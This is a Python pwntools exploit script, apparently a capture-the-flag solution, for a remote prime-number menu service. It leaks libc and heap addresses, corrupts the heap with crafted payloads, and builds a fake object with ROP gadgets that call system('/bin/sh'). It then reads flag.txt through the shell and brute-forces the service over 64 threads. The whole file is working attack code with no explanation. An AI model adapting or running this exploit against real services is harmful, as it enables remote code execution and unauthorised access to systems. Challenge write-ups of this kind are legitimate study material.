#!/usr/bin/env python3

import os
import sys
import time
import threading

import pwn

def add_primes(io, primes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(len(primes)).encode())

    for prime in primes:
        io.sendlineafter(b': ', str(prime).encode())

def remove_primes(io, primes):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(len(primes)).encode())
    
    for prime in primes:
        io.sendlineafter(b': ', str(prime).encode())

def replace_primes(io, primes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(len(primes)).encode())
    
    for prime in primes:
        io.sendlineafter(b': ', str(prime).encode())

def print_prime(io, idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    line = io.recvline().strip().decode()
    return line.split('=')[1].strip()

def attack(io):
    primes = list(range(3, 0xb00+3))
    add_primes(io, primes)

    N = 0x100
    remove_primes(io, primes[N//2:])
    remove_primes(io, primes[:N//2])

    leak1 = print_prime(io, 225)
    leak2 = print_prime(io, 239)
    libc_base = int(leak1, 16) - 0x6b6de8
    heap_base = int(leak2, 16) - 0x1ebda8

    print(f'libc_base: {hex(libc_base)}')
    print(f'heap_base: {hex(heap_base)}')

    obj_start = heap_base + 0x192958

    if (libc_base >> 30) & 3 > 0:
        print('[-] wrong libc_base bits')
        return False

    if (obj_start >> 30) & 3 > 0:
        print('[-] wrong obj_start bits')
        return False

    for i in range(8):
        if (obj_start >> (i*8)) & 0xFF >= 0x80:
            print('[-] not printable obj_start')
            return False

    print('[+] good obj_start and libc_base')

    add_primes(io, [(1 << (223*64)) - 1])
    replace_primes(io, [])
    
    add_primes(io, [123456])

    payload = b''.join([
        b'AAAAAAAA',
        pwn.p64(0), b'XZXZXZXZ',
        (pwn.p64(0x4141414141414141) + pwn.p64(0x131))*0x71,
        pwn.p64(0), b'\x71', 
    ])

    io.sendlineafter(b'> ', payload)
    io.sendlineafter(b'> ', payload)

    add_primes(io, [12345])

    replace_primes(io, [1]*0x70)

    gadget1 = libc_base + 0x000000000014a736 # : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
    gadget2 = libc_base + 0x000000000009afe7 # : mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    system = libc_base + 0x53110
    binsh = libc_base + 0x1a5ea4

    fake_obj = [
        1, obj_start + 0x10,
        0, 0,
        0, 0,
        0, obj_start + 0x50,
        gadget1, 0,
        system, binsh,
        gadget2, 0,
    ]
    fake_obj = fake_obj + [gadget1]*(100 - len(fake_obj))

    payload = 0
    for x in fake_obj[::-1]:
        payload = payload << 30
        payload = payload | ((x >> 32) & ((1 << 30) - 1))
        payload = payload << 30
        payload = payload | (x & ((1 << 30) - 1))

    io.sendline(b'2')
    io.sendlineafter(b'count: ', f'{-payload}'.encode())

    payload = pwn.p64(obj_start)*0xd2
    io.sendlineafter(b'> ', payload)

    time.sleep(1)
    io.sendline(b'0')

    io.recvuntil(b'[*] Bye.\n')
    time.sleep(1)
    io.sendline(b'cat flag.txt')
    time.sleep(1)
    print(io.recvline())

    # io.interactive()

    return True

def main():
    host = sys.argv[1]
    port = sys.argv[2]

    while True:
        with pwn.remote(host, port) as io:
            try:
                if attack(io):
                    os._exit(0)
            except Exception as e:
                print(f'[-] {e}')

if __name__ == '__main__':
    # main()
    # exit()

    num = 64

    threads = [threading.Thread(target=main) for _ in range(num)]

    for thread in threads:
        thread.start()
        time.sleep(0.5)

    for thread in threads:
        thread.join()
